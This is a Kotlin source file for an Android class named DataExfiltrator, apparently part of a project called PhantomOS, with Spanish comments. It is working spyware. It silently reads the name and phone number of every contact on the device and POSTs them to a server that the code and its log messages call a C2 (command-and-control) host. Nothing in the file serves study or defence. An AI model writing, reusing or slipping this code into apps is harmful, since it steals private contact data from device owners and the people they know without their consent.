package com.phantomos.phantomos

import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import android.util.Log
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class DataExfiltrator(private val context: Context) {
    private val TAG = "DataExfil"
    private val SERVER_IP = "192.168.1.100" // IP de tu PC/C2 o la IP del propio dispositivo si es auto-hospedado
    private val PORT = 8080

    fun exfiltrateContacts() {
        Thread {
            try {
                val contacts = getContactsList()
                if (contacts.isNotEmpty()) {
                    sendToServer(contacts)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error exfiltrando contactos", e)
            }
        }.start()
    }

    private fun getContactsList(): String {
        val sb = StringBuilder()
        val cursor: Cursor? = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use { c ->
            while (c.moveToNext()) {
                val name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                sb.append("$name:$number\n")
            }
        }
        return sb.toString()
    }

    private fun sendToServer(data: String) {
        try {
            val url = URL("http://$SERVER_IP:$PORT/upload")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            OutputStreamWriter(connection.outputStream).use { it.write(data) }
            Log.i(TAG, "Datos enviados al C2")
        } catch (e: Exception) {
            Log.e(TAG, "Fallo envío al servidor", e)
        }
    }
}
